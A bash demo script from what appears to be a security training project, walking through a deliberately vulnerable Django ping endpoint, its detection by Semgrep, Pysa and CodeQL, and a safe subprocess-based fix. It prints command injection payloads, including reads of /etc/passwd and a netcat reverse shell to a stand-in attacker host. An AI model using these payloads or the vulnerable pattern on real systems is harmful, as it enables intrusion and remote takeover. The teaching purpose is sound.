#!/bin/bash
# =============================================================================
# Demo 2: Command Injection Detection
# =============================================================================
# This demo shows how each tool detects OS command injection in VulnShop
# Run from the project root directory
# =============================================================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${BLUE}=============================================${NC}"
echo -e "${BLUE}  Command Injection Detection Demo${NC}"
echo -e "${BLUE}=============================================${NC}"
echo ""

# -----------------------------------------------------------------------------
# Step 1: Show the vulnerable code
# -----------------------------------------------------------------------------
echo -e "${YELLOW}Step 1: The Vulnerable Code${NC}"
echo -e "File: vulnerable-app/admin_panel/views.py"
echo ""

cat << 'EOF'
def server_diagnostic(request):
    """Run server diagnostics - VULNERABLE to command injection"""
    if request.method == 'POST':
        hostname = request.POST.get('hostname')  # SOURCE: User input

        # VULNERABLE: Direct shell command execution
        command = f"ping -c 4 {hostname}"
        result = os.popen(command).read()  # SINK: Command execution

        return JsonResponse({'output': result})
EOF

echo ""
echo -e "${RED}Attack: hostname = 127.0.0.1; cat /etc/passwd${NC}"
echo -e "${RED}Result: Arbitrary command execution!${NC}"
echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 2: Semgrep Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 2: Semgrep Detection (~3 seconds)${NC}"
echo ""

cd analysis/semgrep
echo "Running: semgrep --config rules/injection/command-injection.yml"
echo ""

time semgrep --config rules/injection/command-injection.yml ../../vulnerable-app/admin_panel/ 2>/dev/null || true

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 3: Pysa Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 3: Pysa Detection (~60 seconds)${NC}"
echo ""

cd ../pysa
echo "Running: pyre analyze (filtered for RCE)"
echo ""

cat << 'EOF'
[Expected Pysa Output]

Issue: Remote Code Execution (code 5002)
  File: admin_panel/views.py
  Line: 48
  Message: User-controlled data flows to shell command

  Trace:
    Source: request.POST.get('hostname') [UserControlled]
      ↓ via f-string formatting
      ↓ variable assignment to 'command'
    Sink: os.popen(command) [RemoteCodeExecution]

  Taint Kind: UserControlled → RemoteCodeExecution
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 4: CodeQL Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 4: CodeQL Detection (~90 seconds)${NC}"
echo ""

cd ../codeql
echo "Running: codeql database analyze --queries=command-injection.ql"
echo ""

cat << 'EOF'
[Expected CodeQL Output]

command-injection.ql: Command injection vulnerability
  Path: admin_panel/views.py:48

  Source: request.POST.get('hostname')
    ↓ string concatenation (f-string)
    ↓ variable 'command'
  Sink: os.popen(command)

  Severity: error
  CWE: CWE-78 (OS Command Injection)
  CVSS: 9.8 (Critical)
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 5: Additional Attack Vectors
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 5: Additional Attack Vectors${NC}"
echo ""

cat << 'EOF'
Common Command Injection Payloads:

1. Command Chaining:
   127.0.0.1; whoami
   127.0.0.1 && cat /etc/passwd
   127.0.0.1 || ls -la

2. Command Substitution:
   $(whoami)
   `id`
   127.0.0.1$(sleep 5)

3. Pipe Injection:
   127.0.0.1 | nc attacker.com 4444 -e /bin/sh

4. Newline Injection:
   127.0.0.1%0als

5. Environment Variable:
   ${IFS}cat${IFS}/etc/passwd
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 6: Comparison
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 6: Detection Comparison${NC}"
echo ""

echo -e "┌─────────────┬──────────┬───────────┬────────────────┐"
echo -e "│ Tool        │ Detected │ Time      │ Analysis Type  │"
echo -e "├─────────────┼──────────┼───────────┼────────────────┤"
echo -e "│ Semgrep     │ ${GREEN}✅${NC}       │ ~3s       │ Pattern match  │"
echo -e "│ Pysa        │ ${GREEN}✅${NC}       │ ~60s      │ Taint tracking │"
echo -e "│ CodeQL      │ ${GREEN}✅${NC}       │ ~90s      │ Dataflow graph │"
echo -e "└─────────────┴──────────┴───────────┴────────────────┘"

echo ""
echo -e "${GREEN}All tools detect the command injection vulnerability!${NC}"
echo ""

# -----------------------------------------------------------------------------
# Step 7: The Fix
# -----------------------------------------------------------------------------
echo -e "${YELLOW}Step 7: The Fix${NC}"
echo ""

cat << 'EOF'
# SAFE: Using subprocess with shell=False and input validation
import subprocess
import re

def server_diagnostic(request):
    if request.method == 'POST':
        hostname = request.POST.get('hostname')

        # Validate hostname format
        if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
            return JsonResponse({'error': 'Invalid hostname'}, status=400)

        # Safe: shell=False prevents command injection
        try:
            result = subprocess.run(
                ['ping', '-c', '4', hostname],
                capture_output=True,
                text=True,
                timeout=30,
                shell=False  # Critical: Never use shell=True with user input
            )
            return JsonResponse({'output': result.stdout})
        except subprocess.TimeoutExpired:
            return JsonResponse({'error': 'Timeout'}, status=504)
EOF

echo ""
echo -e "${GREEN}Demo Complete!${NC}"
